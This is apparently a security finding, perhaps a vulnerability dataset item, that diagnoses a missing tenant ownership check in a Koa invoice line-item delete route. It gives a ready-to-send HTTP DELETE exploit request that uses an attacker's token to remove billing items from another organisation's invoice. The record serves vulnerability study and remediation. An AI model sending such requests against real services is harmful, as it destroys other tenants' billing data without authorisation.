diagnosis: The Koa route handler authenticates the user into ctx.state.user via authenticateKoa, but directly deletes the invoice line item matching invoiceId and itemId without verifying that the invoice belongs to ctx.state.user.organizationId. A tenant can delete billable line items from invoices belonging to other corporate accounts.
exploit_request:
DELETE /api/v2/invoices/inv_enterprise_9918/items/item_line_4412 HTTP/1.1
Host: billing.saascloud.com
Authorization: Bearer <attacker_jwt>
Content-Length: 0
